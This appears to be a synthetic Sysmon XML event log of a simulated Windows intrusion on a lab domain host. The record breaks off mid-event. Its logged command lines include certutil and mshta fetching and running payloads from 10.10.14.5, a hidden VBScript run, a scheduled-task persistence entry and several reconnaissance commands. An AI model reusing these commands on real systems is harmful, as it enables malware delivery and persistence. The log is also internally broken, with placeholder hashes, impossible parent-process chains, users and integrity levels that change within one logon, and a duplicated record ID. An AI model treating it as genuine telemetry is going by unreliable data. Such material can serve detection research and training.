<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:07:21.0000000Z" />
      <EventRecordID>5066</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:07:21.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0063-000000000c00}</Data>
      <Data Name="ProcessId">6063</Data>
      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">certutil.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">certutil.exe</Data>
      <Data Name="CommandLine">certutil.exe -urlcache -split -f http://10.10.14.5/payload.exe payload.exe</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000003F0000003F0000003F0000003F0000003F,MD5=0000003F0000003F0000003F0000003F,SHA256=0000003F0000003F0000003F0000003F0000003F0000003F0000003F0000003F,IMPHASH=0000003F0000003F0000003F0000003F</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0063-000000000c00}</Data>
      <Data Name="ParentProcessId">5063</Data>
      <Data Name="ParentImage">C:\Windows\System32\whoami.exe</Data>
      <Data Name="ParentCommandLine">whoami /groups</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:07:22.0000000Z" />
      <EventRecordID>5068</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:07:22.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0063-000000000c00}</Data>
      <Data Name="ProcessId">6063</Data>
      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
      <Data Name="DestinationIp">10.10.14.5</Data>
      <Data Name="DestinationPort">443</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:07:28.0000000Z" />
      <EventRecordID>5068</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:07:28.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0064-000000000c00}</Data>
      <Data Name="ProcessId">6064</Data>
      <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">whoami.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">whoami.exe</Data>
      <Data Name="CommandLine">whoami /groups</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000004000000040000000400000004000000040,MD5=00000040000000400000004000000040,SHA256=0000004000000040000000400000004000000040000000400000004000000040,IMPHASH=00000040000000400000004000000040</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0064-000000000c00}</Data>
      <Data Name="ParentProcessId">5064</Data>
      <Data Name="ParentImage">C:\Windows\System32\notepad.exe</Data>
      <Data Name="ParentCommandLine">notepad.exe C:\Users\jsmith\notes.txt</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:07:35.0000000Z" />
      <EventRecordID>5069</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:07:35.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0065-000000000c00}</Data>
      <Data Name="ProcessId">6065</Data>
      <Data Name="Image">C:\Windows\System32\notepad.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">notepad.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">notepad.exe</Data>
      <Data Name="CommandLine">notepad.exe C:\Users\jsmith\notes.txt</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000004100000041000000410000004100000041,MD5=00000041000000410000004100000041,SHA256=0000004100000041000000410000004100000041000000410000004100000041,IMPHASH=00000041000000410000004100000041</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0065-000000000c00}</Data>
      <Data Name="ParentProcessId">5065</Data>
      <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\system32\svchost.exe -k netsvcs -p</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:07:42.0000000Z" />
      <EventRecordID>5070</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:07:42.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0066-000000000c00}</Data>
      <Data Name="ProcessId">6066</Data>
      <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">svchost.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">svchost.exe</Data>
      <Data Name="CommandLine">C:\Windows\system32\svchost.exe -k netsvcs -p</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000004200000042000000420000004200000042,MD5=00000042000000420000004200000042,SHA256=0000004200000042000000420000004200000042000000420000004200000042,IMPHASH=00000042000000420000004200000042</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0066-000000000c00}</Data>
      <Data Name="ParentProcessId">5066</Data>
      <Data Name="ParentImage">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="ParentCommandLine">rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:07:49.0000000Z" />
      <EventRecordID>5071</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:07:49.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0067-000000000c00}</Data>
      <Data Name="ProcessId">6067</Data>
      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">rundll32.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">rundll32.exe</Data>
      <Data Name="CommandLine">rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000004300000043000000430000004300000043,MD5=00000043000000430000004300000043,SHA256=0000004300000043000000430000004300000043000000430000004300000043,IMPHASH=00000043000000430000004300000043</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0067-000000000c00}</Data>
      <Data Name="ParentProcessId">5067</Data>
      <Data Name="ParentImage">C:\Windows\System32\mshta.exe</Data>
      <Data Name="ParentCommandLine">mshta.exe http://10.10.14.5/payload.hta</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:07:56.0000000Z" />
      <EventRecordID>5072</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:07:56.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0068-000000000c00}</Data>
      <Data Name="ProcessId">6068</Data>
      <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">mshta.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">mshta.exe</Data>
      <Data Name="CommandLine">mshta.exe http://10.10.14.5/payload.hta</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000004400000044000000440000004400000044,MD5=00000044000000440000004400000044,SHA256=0000004400000044000000440000004400000044000000440000004400000044,IMPHASH=00000044000000440000004400000044</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0068-000000000c00}</Data>
      <Data Name="ParentProcessId">5068</Data>
      <Data Name="ParentImage">C:\Windows\System32\wscript.exe</Data>
      <Data Name="ParentCommandLine">wscript.exe //B C:\Users\Public\update.vbs</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:08:03.0000000Z" />
      <EventRecordID>5073</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:08:03.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0069-000000000c00}</Data>
      <Data Name="ProcessId">6069</Data>
      <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">wscript.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">wscript.exe</Data>
      <Data Name="CommandLine">wscript.exe //B C:\Users\Public\update.vbs</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000004500000045000000450000004500000045,MD5=00000045000000450000004500000045,SHA256=0000004500000045000000450000004500000045000000450000004500000045,IMPHASH=00000045000000450000004500000045</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0069-000000000c00}</Data>
      <Data Name="ParentProcessId">5069</Data>
      <Data Name="ParentImage">C:\Windows\System32\net.exe</Data>
      <Data Name="ParentCommandLine">net user administrator /domain</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:08:10.0000000Z" />
      <EventRecordID>5074</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:08:10.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0070-000000000c00}</Data>
      <Data Name="ProcessId">6070</Data>
      <Data Name="Image">C:\Windows\System32\net.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">net.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">net.exe</Data>
      <Data Name="CommandLine">net user administrator /domain</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000004600000046000000460000004600000046,MD5=00000046000000460000004600000046,SHA256=0000004600000046000000460000004600000046000000460000004600000046,IMPHASH=00000046000000460000004600000046</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0070-000000000c00}</Data>
      <Data Name="ParentProcessId">5070</Data>
      <Data Name="ParentImage">C:\Windows\System32\ipconfig.exe</Data>
      <Data Name="ParentCommandLine">ipconfig /all</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:08:17.0000000Z" />
      <EventRecordID>5075</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:08:17.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0071-000000000c00}</Data>
      <Data Name="ProcessId">6071</Data>
      <Data Name="Image">C:\Windows\System32\ipconfig.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">ipconfig.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">ipconfig.exe</Data>
      <Data Name="CommandLine">ipconfig /all</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000004700000047000000470000004700000047,MD5=00000047000000470000004700000047,SHA256=0000004700000047000000470000004700000047000000470000004700000047,IMPHASH=00000047000000470000004700000047</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0071-000000000c00}</Data>
      <Data Name="ParentProcessId">5071</Data>
      <Data Name="ParentImage">C:\Windows\System32\tasklist.exe</Data>
      <Data Name="ParentCommandLine">tasklist /v</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:08:24.0000000Z" />
      <EventRecordID>5076</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:08:24.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0072-000000000c00}</Data>
      <Data Name="ProcessId">6072</Data>
      <Data Name="Image">C:\Windows\System32\tasklist.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">tasklist.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">tasklist.exe</Data>
      <Data Name="CommandLine">tasklist /v</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000004800000048000000480000004800000048,MD5=00000048000000480000004800000048,SHA256=0000004800000048000000480000004800000048000000480000004800000048,IMPHASH=00000048000000480000004800000048</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0072-000000000c00}</Data>
      <Data Name="ParentProcessId">5072</Data>
      <Data Name="ParentImage">C:\Windows\System32\reg.exe</Data>
      <Data Name="ParentCommandLine">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:08:31.0000000Z" />
      <EventRecordID>5077</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:08:31.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0073-000000000c00}</Data>
      <Data Name="ProcessId">6073</Data>
      <Data Name="Image">C:\Windows\System32\reg.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">reg.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">reg.exe</Data>
      <Data Name="CommandLine">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000004900000049000000490000004900000049,MD5=00000049000000490000004900000049,SHA256=0000004900000049000000490000004900000049000000490000004900000049,IMPHASH=00000049000000490000004900000049</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0073-000000000c00}</Data>
      <Data Name="ParentProcessId">5073</Data>
      <Data Name="ParentImage">C:\Windows\System32\schtasks.exe</Data>
      <Data Name="ParentCommandLine">schtasks /create /tn Updater /tr C:\Users\Public\upd.exe /sc onlogon</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:08:38.0000000Z" />
      <EventRecordID>5078</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:08:38.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0074-000000000c00}</Data>
      <Data Name="ProcessId">6074</Data>
      <Data Name="Image">C:\Windows\System32\schtasks.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">schtasks.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">schtasks.exe</Data>
      <Data Name="CommandLine">schtasks /create /tn Updater /tr C:\Users\Public\upd.exe /sc onlogon</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000004A0000004A0000004A0000004A0000004A,MD5=0000004A0000004A0000004A0000004A,SHA256=0000004A0000004A0000004A0000004A0000004A0000004A0000004A0000004A,IMPHASH=0000004A0000004A0000004A0000004A</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0074-000000000c00}</Data>
      <Data Name="ParentProcessId">5074</Data>
      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:08:45.0000000Z" />
      <EventRecordID>5079</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:08:45.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0075-000000000c00}</Data>
      <Data Name="ProcessId">6075</Data>
      <Data Name="Image">C:\Windows\explorer.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">explorer.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">explorer.exe</Data>
      <Data Name="CommandLine">C:\Windows\Explorer.EXE</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000004B0000004B0000004B0000004B0000004B,MD5=0000004B0000004B0000004B0000004B,SHA256=0000004B0000004B0000004B0000004B0000004B0000004B0000004B0000004B,IMPHASH=0000004B0000004B0000004B0000004B</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0075-000000000c00}</Data>
      <Data Name="ParentProcessId">5075</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
